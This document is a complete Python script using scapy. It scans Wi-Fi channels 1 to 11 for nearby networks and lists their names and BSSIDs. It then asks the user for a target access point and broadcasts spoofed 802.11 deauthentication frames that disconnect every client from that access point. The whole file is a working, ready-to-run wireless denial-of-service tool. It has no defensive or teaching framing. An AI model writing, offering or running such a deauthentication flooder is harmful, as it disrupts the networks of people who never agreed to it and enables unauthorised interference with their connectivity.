import subprocess
from scapy.all import Dot11, RadioTap, sniff, sendp, Dot11Deauth

# Wi-Fi interface (e.g., "wlan0")
wifi_interface = "wlan0"

# Function to change Wi-Fi channel using iwconfig
def change_channel(channel):
    subprocess.run(["iwconfig", wifi_interface, "channel", str(channel)])

# Set to store unique SSIDs and BSSIDs of discovered networks
found_networks = set()

# Callback function to process captured packets
def packet_callback(packet):
    if packet.haslayer(Dot11) and packet.haslayer(RadioTap):
        if packet.type == 0 and packet.subtype == 8:  # Beacon frame
            try:
                ssid = packet.info.decode('utf-8')
            except UnicodeDecodeError:
                ssid = "Non-UTF-8 SSID"
            bssid = packet.addr3
            found_networks.add((ssid, bssid))

# Function to send deauthentication packet to all devices associated with an AP
def send_deauth(target_bssid, num_packets):
    # Create a deauthentication frame
    deauth_frame = (
        RadioTap() /
        Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) /
        Dot11Deauth(reason=7)  # Reason 7 is a common value for deauthentication
    )

    # Send the deauthentication frame
    sendp(deauth_frame, iface=wifi_interface, count=num_packets)
    print(f"Sent {num_packets} packets")

# Iterate through channels 1 to 11
for channel in range(1, 12):
    print(f"Scanning on channel {channel}")
    # Change Wi-Fi channel using iwconfig
    change_channel(channel)
    # Start sniffing on the specified channel using the iface argument
    sniff(iface=wifi_interface, prn=packet_callback, store=0, count=10, timeout=5)

# Display the found Wi-Fi networks after scanning is complete
print("\nFound Wi-Fi Networks:")
for ssid, bssid in found_networks:
    print(f"SSID: {ssid}, BSSID: {bssid}")

# Get user input for the target BSSID and number of packets
target_bssid = input("\nEnter the BSSID of the AP to deauthenticate all devices: ")
num_packets = int(input("Enter the number of deauthentication packets to send to each device: "))

# Send deauthentication packets to all devices associated with the target AP
print(f"\nSending {num_packets} deauthentication packets to all devices associated with the AP with BSSID {target_bssid}")
send_deauth(target_bssid, num_packets)
